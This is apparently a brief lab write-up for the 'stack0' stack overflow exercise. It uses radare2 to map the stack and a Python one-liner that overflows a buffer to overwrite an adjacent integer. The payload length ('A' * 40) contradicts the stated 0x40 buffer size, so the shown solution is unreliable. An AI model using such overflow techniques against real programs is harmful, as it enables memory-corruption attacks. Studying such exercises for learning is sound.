Simple stack modification challenge, where we have a buffer of chars, with a size of 0x40, and then a value integer with size 0x4 (int32_t), we can load in radare2 and press the next:

    > aaa # analize the binary
    > afl # list the analyzed functions
    > s @main # move to the main one
    > pdf # disassemble the function
    > afvn buffer <previous char name> # change variable name
    > afvn modified <previous int name> # change variable name
    > afvf # show a static representation of the stack

In that last representation we can see the next:

0x00000048  buffer:     char *
0x00000008  modified:   int32_t

This gives how the stack is represented in reference with the ebp value. As the function only checks if the int32_t value has been modified, we have to modify it at least with one byte, as the buffer size is 0x40, we will fill that buffer with trash, and then one byte more for the modification:

    # python -c "print 'A' * 40 + 'B'" | ./stack0
    # you have changed the 'modified' variable

So great for now
